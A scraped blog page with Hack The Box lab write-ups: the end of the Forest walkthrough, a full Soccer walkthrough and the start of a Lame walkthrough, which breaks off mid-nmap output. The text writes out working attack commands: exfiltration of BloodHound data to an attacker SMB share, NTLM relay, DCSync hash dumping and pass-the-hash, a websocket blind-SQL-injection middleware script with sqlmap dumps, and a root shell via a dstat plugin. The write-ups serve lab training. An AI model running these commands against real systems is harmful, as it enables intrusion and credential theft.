<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop&gt; upload /home/sollupus/RedTeamNote/WeaponizingTools/Domain-penetration/Tools/Sharphood/SharpHound.exe c:\tmp\sharp.exe</span><br></pre></td></tr></table></figure>

<img src="/undefined/a7f75ca4/image-20230312213156062.png" class="">

<img src="/undefined/a7f75ca4/image-20230312213327732.png" class="">

<p>Then get it to local machine.I use smbserver to get that target.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(sollupus㉿kali)-[~/…/WeaponizingTools/Domain-penetration/impacket/examples]</span><br><span class="line">└─$ ./smbserver.py share /home/sollupus/RedTeamNote/Walkthrough/Forest -smb2support -username a -password a</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\tmp&gt;net use \\10.10.16.8\share /u:a a</span><br><span class="line">*Evil-WinRM* PS C:\tmp&gt;copy 20230312045852_BloodHound.zip \\10.10.16.8\share\</span><br><span class="line">*Evil-WinRM* PS C:\tmp&gt;del 20230312045852_BloodHound.zip</span><br><span class="line">*Evil-WinRM* PS C:\tmp&gt;net use /d \\10.10.16.8\share</span><br></pre></td></tr></table></figure>

<p>Then upload it to BloodHound.And use that quey to find the shortest way from owner to administrator.</p>
<img src="/undefined/a7f75ca4/image-20230312213915439.png" class="">

<p>With that graph,we can know owner is belong to group <code>EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL</code>,which means that you have privilege to modify domain ACL.</p>
<h3 id="NTLM-relay"><a href="#NTLM-relay" class="headerlink" title="NTLM-relay"></a>NTLM-relay</h3><p>1.Firstly, add <code>svc-alfresco</code> to group <code>Exchange Windows Permissions</code>.</p>
<img src="/undefined/a7f75ca4/image-20230312214603499.png" class="">



<p>2.Then Run the <code>ntlmrelayx.py</code> man-in-the-middle (“mitm”) tool with the <code>--escalate-user</code> flag. What this will essentially do is when it identifies the login  attempt of the “svc-alfresco” user on the same network, it will mitm to  automatically check the user privileges, and if it can modify the domain ACL, it will modify the user permissions to add <code>Replication-Get-Changes-All</code> privileges to the user account, which can do a DCSync.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(sollupus㉿kali)-[~/…/WeaponizingTools/Domain-penetration/impacket/examples]</span><br><span class="line">└─$ ./ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user svc-alfresco </span><br></pre></td></tr></table></figure>

<img src="/undefined/a7f75ca4/image-20230312214801416.png" class="">

<p>3.Then, we will do a random authentication using the <code>svc-alfresco</code>  account. In this case, I used <code>psexec.py</code> to do an authenticate attempt against my own Kali box.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(sollupus㉿kali)-[~/…/WeaponizingTools/Domain-penetration/impacket/examples]</span><br><span class="line">└─$ ./psexec.py htb.local/svc-alfresco:s3rvice@10.10.16.8</span><br></pre></td></tr></table></figure>
<img src="/undefined/a7f75ca4/image-20230312215108184.png" class="">

<p>​	Obviously,<code>psexec.py</code> will failed because there is no smb server runing in my kali box.However,<code>ntlmrelayx.py</code> will capture authentication attempt of the <code>htb.local/svc-alfresco</code> to the <code>ldap://10.10.10.161</code>.And since it is valid credentials to the Forces box, it will successfully authenticate and escalate our privileges to add <code>Replication-Get-Changes-All</code>.</p>
<h3 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h3><p>Then we can use <code>secretdump.py</code> to dump the Administrator’s NTML hash.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(sollupus㉿kali)-[~/…/WeaponizingTools/Domain-penetration/impacket/examples]</span><br><span class="line">└─$ ./secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161</span><br></pre></td></tr></table></figure>
<img src="/undefined/a7f75ca4/image-20230312215522843.png" class="">

<p>Then use evil-winrm ,we can connect to forest box as Administrator.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(sollupus㉿kali)-[~/…/WeaponizingTools/Domain-penetration/impacket/examples]</span><br><span class="line">└─$ evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 </span><br></pre></td></tr></table></figure>

<p>And that means we get this Dc,and root.txt is in Administrator’s desktop.</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/undefined/236928b6.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="So1Lupus">
      <meta itemprop="description" content="So1Lupus的个人博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="So1Lupus">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/undefined/236928b6.html" class="post-title-link" itemprop="url">Road to OSCP-3 Soccer</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-03-07 21:17:30" itemprop="dateCreated datePublished" datetime="2023-03-07T21:17:30+08:00">2023-03-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-09-28 20:29:10" itemprop="dateModified" datetime="2024-09-28T20:29:10+08:00">2024-09-28</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <span id="more"></span>
<h1 id="Soccer"><a href="#Soccer" class="headerlink" title="Soccer"></a>Soccer</h1><blockquote>
<p>Hack The Box — Soccer Machine Simple Writeup by So1Lupus</p>
</blockquote>
<p>Start with nmap</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sC -sV 10.10.11.194 -oN tcp.nmap</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-31 22:45 IST</span><br><span class="line">Nmap scan report for 10.10.11.194 (10.10.11.194)</span><br><span class="line">Host is up (0.22s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE         VERSION</span><br><span class="line">22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)</span><br><span class="line">|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)</span><br><span class="line">|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)</span><br><span class="line">80/tcp   open  http            nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://soccer.htb/</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">9091/tcp open  xmltec-xmlmail?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Connection: close</span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.1 404 Not Found</span><br><span class="line">|     Content-Security-Policy: default-src &#x27;none&#x27;</span><br><span class="line">|     X-Content-Type-Options: nosniff</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 139</span><br><span class="line">|     Date: Sat, 31 Dec 2022 17:16:22 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Error&lt;/title&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;pre&gt;Cannot GET /&lt;/pre&gt;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|     &lt;/html&gt;</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     HTTP/1.1 404 Not Found</span><br><span class="line">|     Content-Security-Policy: default-src &#x27;none&#x27;</span><br><span class="line">|     X-Content-Type-Options: nosniff</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 143</span><br><span class="line">|     Date: Sat, 31 Dec 2022 17:16:22 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Error&lt;/title&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|     &lt;/html&gt;</span><br><span class="line">|   RTSPRequest: </span><br><span class="line">|     HTTP/1.1 404 Not Found</span><br><span class="line">|     Content-Security-Policy: default-src &#x27;none&#x27;</span><br><span class="line">|     X-Content-Type-Options: nosniff</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 143</span><br><span class="line">|     Date: Sat, 31 Dec 2022 17:16:23 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Error&lt;/title&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|_    &lt;/html&gt;</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port9091-TCP:V=7.93%I=7%D=12/31%Time=63B06E60%P=x86_64-pc-linux-gnu%r(i</span><br><span class="line">SF:nformix,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\</span><br><span class="line">SF:r\n\r\n&quot;)%r(drda,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\</span><br><span class="line">SF:x20close\r\n\r\n&quot;)%r(GetRequest,168,&quot;HTTP/1\.1\x20404\x20Not\x20Found\r</span><br><span class="line">SF:\nContent-Security-Policy:\x20default-src\x20&#x27;none&#x27;\r\nX-Content-Type-O</span><br><span class="line">SF:ptions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nC</span><br><span class="line">SF:ontent-Length:\x20139\r\nDate:\x20Sat,\x2031\x20Dec\x202022\x2017:16:22</span><br><span class="line">SF:\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lan</span><br><span class="line">SF:g=\&quot;en\&quot;&gt;\n&lt;head&gt;\n&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;</span><br><span class="line">SF:/head&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20GET\x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&quot;)%r(H</span><br><span class="line">SF:TTPOptions,16C,&quot;HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Po</span><br><span class="line">SF:licy:\x20default-src\x20&#x27;none&#x27;\r\nX-Content-Type-Options:\x20nosniff\r\</span><br><span class="line">SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143</span><br><span class="line">SF:\r\nDate:\x20Sat,\x2031\x20Dec\x202022\x2017:16:22\x20GMT\r\nConnection</span><br><span class="line">SF::\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\&quot;en\&quot;&gt;\n&lt;head&gt;\n&lt;m</span><br><span class="line">SF:eta\x20charset=\&quot;utf-8\&quot;&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;pre&gt;</span><br><span class="line">SF:Cannot\x20OPTIONS\x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&quot;)%r(RTSPRequest,16C,&quot;H</span><br><span class="line">SF:TTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-</span><br><span class="line">SF:src\x20&#x27;none&#x27;\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x2</span><br><span class="line">SF:0text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Sat,</span><br><span class="line">SF:\x2031\x20Dec\x202022\x2017:16:23\x20GMT\r\nConnection:\x20close\r\n\r\</span><br><span class="line">SF:n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\&quot;en\&quot;&gt;\n&lt;head&gt;\n&lt;meta\x20charset=\&quot;</span><br><span class="line">SF:utf-8\&quot;&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20OPTIONS</span><br><span class="line">SF:\x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&quot;)%r(RPCCheck,2F,&quot;HTTP/1\.1\x20400\x20Ba</span><br><span class="line">SF:d\x20Request\r\nConnection:\x20close\r\n\r\n&quot;)%r(DNSVersionBindReqTCP,2</span><br><span class="line">SF:F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n&quot;)</span><br><span class="line">SF:%r(DNSStatusRequestTCP,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnec</span><br><span class="line">SF:tion:\x20close\r\n\r\n&quot;)%r(Help,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\</span><br><span class="line">SF:r\nConnection:\x20close\r\n\r\n&quot;)%r(SSLSessionReq,2F,&quot;HTTP/1\.1\x20400\</span><br><span class="line">SF:x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n&quot;);</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<p>Get three port</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Open Ports | Service Running</span><br><span class="line">-----------|-----------------</span><br><span class="line">22         | ssh</span><br><span class="line">80         | http</span><br><span class="line">9091       | xmltec-xmlmail</span><br></pre></td></tr></table></figure>

<p>Firstly,we should add <code>soccer.htb</code> to our &#x2F;etc&#x2F;hosts file.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.10.14.9 soccer.htb&quot; |sudo tee -a /etc/hosts</span><br></pre></td></tr></table></figure>

<p>Then we can get to soccer.htb website.</p>
<img src="/undefined/236928b6/1.png" class="">

<p>​	Then website enumration</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://soccer.htb/ -w  /usr/share/seclists/Discovery/Web-Content/big.txt</span><br></pre></td></tr></table></figure>

<img src="/undefined/236928b6/image-20230307195637576.png" class="">

<p>We get such a result that show a  interesting things like de sub directory <code>/tiny</code>.So we try to get to it.</p>
<img src="/undefined/236928b6/image-20230307200117180.png" class="">

<p>From this page,we can find that there is a link and a title that names tiny file manager.Go to that link, we can find a default username and password for this manager.So try it.</p>
<img src="/undefined/236928b6/image-20230307200431670.png" class="">

<p>Using admin&#x2F;admin@123,we can login into it as admin.</p>
<img src="/undefined/236928b6/image-20230307200949744.png" class="">

<p>And we can upload files without filtering.Then we can get a shell to the target as www-data user.</p>
<img src="/undefined/236928b6/image-20230307201721218.png" class="">

<p>Then ,in the <code>/etc/nginx/site-enabled</code> folder ,we can find a file named <code>soc-player.htb</code>. And that file contains a subdomain <code>soc-player.soccer.htb</code>.So we add it to our &#x2F;etc&#x2F;hosts.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.10.11.194 soc-player.soccer.htb&quot;|sudo tee -a /etc/hosts</span><br></pre></td></tr></table></figure>

<p>Then visit it .And there is something more like login,signup and match.</p>
<img src="/undefined/236928b6/image-20230307202435641.png" class="">

<p>After signing up and login,ticket page shows.On Viewing the source code, we get to know that this field is connected to the Web socket</p>
<img src="/undefined/236928b6/image-20230307202958737.png" class="">

<p>And we found that socket can be vulnerable to blind SQL injection and sqlmap has ws protocol support.With belowing code from this link <a target="_blank" rel="noopener" href="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html">https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html</a>, we can use sqlmap to injection thorough that websocket.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> SimpleHTTPRequestHandler</span><br><span class="line"><span class="keyword">from</span> socketserver <span class="keyword">import</span> TCPServer</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote,urlparse</span><br><span class="line"><span class="keyword">from</span> websocket <span class="keyword">import</span> create_connenction</span><br><span class="line"></span><br><span class="line"><span class="comment">#sqlmap nodejs websocket</span></span><br><span class="line"></span><br><span class="line">ws_server = <span class="string">&quot;ws://soc-player.soccer.htb:9091&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_ws</span>(<span class="params">payload</span>):</span><br><span class="line">    ws = create_connenction(ws_server)</span><br><span class="line">    message =  unquote(payload).replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&quot;\&#x27;&quot;</span>)</span><br><span class="line">    data = <span class="string">&#x27;&#123;&quot;id&quot;:&quot;%s&quot;&#125;&#x27;</span>%message</span><br><span class="line">    ws.send(data)</span><br><span class="line">    resp = ws.recv()</span><br><span class="line">    ws.close()</span><br><span class="line">    <span class="keyword">if</span> resp:</span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">middleware_server</span>(<span class="params">host_post,content_type=<span class="string">&#x27;text/plain&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">CustomHandler</span>(<span class="title class_ inherited__">SimpleHTTPRequestHandler</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">            self.send_response(<span class="number">200</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                payload = urlparse(self.path).query.split(<span class="string">&quot;=&quot;</span>,<span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">except</span> IndexError:</span><br><span class="line">                payload=<span class="literal">False</span></span><br><span class="line">            <span class="keyword">if</span> payload:</span><br><span class="line">                content = send_ws(payload)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                content = <span class="string">&quot;None&quot;</span></span><br><span class="line">            self.send_header(<span class="string">&quot;Content-type&quot;</span>,content_type)</span><br><span class="line">            self.end_headers()</span><br><span class="line">            self.wfile.write(content.encode())</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">_TCPServer</span>(<span class="title class_ inherited__">TCPServer</span>):</span><br><span class="line">        allow_reuse_address = <span class="literal">True</span></span><br><span class="line">        httpd = TCPServer(host_post,CustomHandler)</span><br><span class="line">        httpd.serve_forever()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Starting MiddleWare Server&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Send payloads in http://localhost:8081/?id=*&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    middleware_server((<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">8081</span>))</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>Run the exploit and use sqlmap</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://localhost:8081/?id=1&quot;</span><br><span class="line">sqlmap -u &quot;http://localhost:8081/?id=1&quot; --current-db</span><br><span class="line">sqlmap -u &quot;http://localhost:8081/?id=1&quot; -D soccer_db --tables</span><br><span class="line">sqlmap -u &quot;http://localhost:8081/?id=1&quot; -D soccer_db -T accounts --dump</span><br></pre></td></tr></table></figure>

<img src="/undefined/236928b6/image-20230307203614900.png" class="">

<p>we can ssh into the machine with these credentials.</p>
<p>Then using linpeas.sh to enumration.</p>
<img src="/undefined/236928b6/image-20230307204636499.png" class="">

<blockquote>
<p>The <code>doas</code> utility executes the given command as another user. The command argument is mandatory unless <code>-C*</code>, <code>-L, or </code>-s&#96; is specified.</p>
<p>The user will be required to authenticate by entering their password, unless configured otherwise.</p>
</blockquote>
<p>And what is dstat.<a target="_blank" rel="noopener" href="https://linux.die.net/man/1/dstat">https://linux.die.net/man/1/dstat</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name dstat -type d 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<img src="/undefined/236928b6/image-20230307204815081.png" class="">

<p>then we can make a reverse_shell in dstat_rev.py to the &#x2F;usr&#x2F;local&#x2F;share&#x2F;dstat directory.</p>
<p>And use doas ,we can get root shell.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">doas -u root /usr/bin/dstat — rev</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/undefined/442af4ad.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="So1Lupus">
      <meta itemprop="description" content="So1Lupus的个人博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="So1Lupus">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/undefined/442af4ad.html" class="post-title-link" itemprop="url">Road to OSCP-2 Lame</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-03-06 22:03:57" itemprop="dateCreated datePublished" datetime="2023-03-06T22:03:57+08:00">2023-03-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-09-28 20:29:07" itemprop="dateModified" datetime="2024-09-28T20:29:07+08:00">2024-09-28</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <span id="more"></span>
<h1 id="HTB-Lame"><a href="#HTB-Lame" class="headerlink" title="HTB-Lame"></a>HTB-Lame</h1><blockquote>
<p>Easy one</p>
</blockquote>
<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><p>Starting with nmap scanning , we can find 5 port is opening.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 